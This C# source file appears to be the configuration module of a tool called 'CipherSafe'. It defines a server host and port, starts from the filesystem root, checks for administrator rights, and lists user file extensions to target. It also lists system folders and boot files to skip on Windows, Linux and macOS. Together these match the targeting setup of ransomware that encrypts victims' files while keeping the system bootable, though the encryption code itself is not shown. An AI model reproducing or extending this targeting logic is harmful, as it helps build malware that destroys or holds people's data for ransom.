// Copyright (C) PhcNguyen Developers
// Distributed under the terms of the Modified BSD License.

using System.Runtime.InteropServices;
using System.Security.Principal;

namespace CipherSafe.Application;
static class Config
{
    private static readonly string BaseDir = AppDomain.CurrentDomain.BaseDirectory;
    private static readonly string resources = Path.Combine(BaseDir, "Resources");

    public static readonly string Host = "192.168.1.2";
    public static readonly int Port = 64000;

    public static string Root() => RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? @"C:\" : "/";

    public static (bool isAdmin, int platform) IsAdmin()
    {
        bool isAdmin = false;
        int platformId = 0;

        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            var identity = WindowsIdentity.GetCurrent();
            isAdmin = new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);
            platformId = 1;
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            isAdmin = Environment.UserName == "root" || Environment.GetEnvironmentVariable("SUDO_USER") != null;
            platformId = RuntimeInformation.IsOSPlatform(OSPlatform.Linux) ? 2 : 3;
        }

        return (isAdmin, platformId);
    }

    public static HashSet<string> GetAllowedFileExtensions() => new HashSet<string>
    {
        // Tệp văn bản
        ".txt", ".csv", ".xml", ".json", ".html", ".css", ".cpp", ".cs", ".java",
        ".py", ".js", ".rb", ".go", ".php", ".asp", ".aspx", ".doc", ".docx",
        ".odt", 

        // Tệp tài liệu
        ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".mdb", 

        // Hình ảnh
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".psd", ".ico",

        // Âm thanh
        ".mp3", ".wav", ".ogg", ".flac",

        // Video
        ".mp4", ".avi", ".mkv", ".mov",

        // Tệp nén
        ".zip", ".rar", ".tar", ".gz", ".7z",

        // Tệp thiết kế
        ".ai", ".sketch",

        // Tệp cấu hình
        ".yaml", ".ini", ".sln"
    };

    public static List<string> GetSkippedFolders()
    {
        List<string> directories = new();
        string userName = Environment.UserName;

        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            directories.AddRange(new List<string>
            {
                "C:\\OEM", "C:\\Windows", "C:\\PerfLogs", "C:\\Recovery", "C:\\$SysReset",
                "C:\\Config.Msi", "C:\\ProgramData", "C:\\$WinREAgent", "C:\\OneDriveTemp",
                "C:\\$Recycle.Bin", "C:\\Program Files", "C:\\Users\\Public", "C:\\Users\\Default",
                "C:\\Program Files (x86)", "C:\\Documents and Settings", "C:\\System Volume Information",
                "C:\\Users\\All Users\\Desktop", "C:\\Users\\All Users\\Packages", "C:\\Users\\All Users\\Documents",
                "C:\\Users\\All Users\\Microsoft", "C:\\Users\\All Users\\Start Menu",
                $"C:\\Users\\{userName}\\Recent", $"C:\\Users\\{userName}\\AppData\\Local\\Temp\\msd"
            });
            directories.AddRange(new List<string>
            {
                $"C:\\Users\\{userName}\\AppData\\Local\\Temporary Internet Files",
                $"C:\\Users\\{userName}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.IE5",
                $"C:\\Users\\{userName}\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files"
            });
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
        {
            directories.AddRange(new List<string> { "/usr", "/opt", "/sys", "/var", "/dev", "/etc", "/run", "/lib", "/tmp", "/proc" });
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            directories.AddRange(new List<string>
            {
                "/usr", "/bin", "/var", "/etc", "/sbin", "/cores", "/System", "/var/db",
                "/private", "/var/root", "/Applications", "~/Library/Logs", "~/Library/Caches",
                "~/Library/Containers", "~/Library/Preferences", "~/Library/LaunchAgents",
                "~/Library/Application Support", "~/Library/Saved Application State"
            });
        }

        if (!IsAdmin().isAdmin)
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                directories.AddRange(new List<string>
                {
                    $"C:\\Users\\{userName}\\SendTo", $"C:\\Users\\{userName}\\NetHood",
                    $"C:\\Users\\{userName}\\Cookies", $"C:\\Users\\{userName}\\Templates",
                    $"C:\\Users\\{userName}\\PrintHood", $"C:\\Users\\{userName}\\Start Menu",
                    $"C:\\Users\\{userName}\\My Documents", $"C:\\Users\\{userName}\\Local Settings",
                    $"C:\\Users\\{userName}\\Application Data", $"C:\\Users\\{userName}\\AppData\\Local\\Application Data",
                    $"C:\\Users\\{userName}\\AppData\\Local\\ElevatedDiagnostics",
                });
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {
                directories.Add("root");
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                directories.AddRange(new List<string> { "~/Library/Mail", "~/Library/WebKit", "~/Library/Cookies", "~/Library/Messages", "~/Library/Keychains" });
            }
        }

        return directories;
    }

    /// <summary>
    /// Kiểm tra xem tên tệp đã cho có phải là tệp ngoại lệ hay không.
    /// </summary>
    /// <param name="FileName">Tên của tệp cần kiểm tra.</param>
    /// <returns>True nếu tệp là ngoại lệ; ngược lại, false.</returns>
    public static bool ExceptionalFile(string FileName)
    {
        FileName = FileName.ToLower();

        // Sử dụng HashSet để tìm kiếm nhanh hơn.
        HashSet<string> exceptionalFiles = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            "iconcache.db",
            "autorun.inf",
            "thumbs.db",
            "boot.ini",
            "bootfont.bin",
            "ntuser.ini",
            "bootmgr",
            "bootmgr.efi",
            "bootmgfw.efi",
            "desktop.ini",
            "ntuser.dat"
        };

        return exceptionalFiles.Contains(FileName);
    }

}
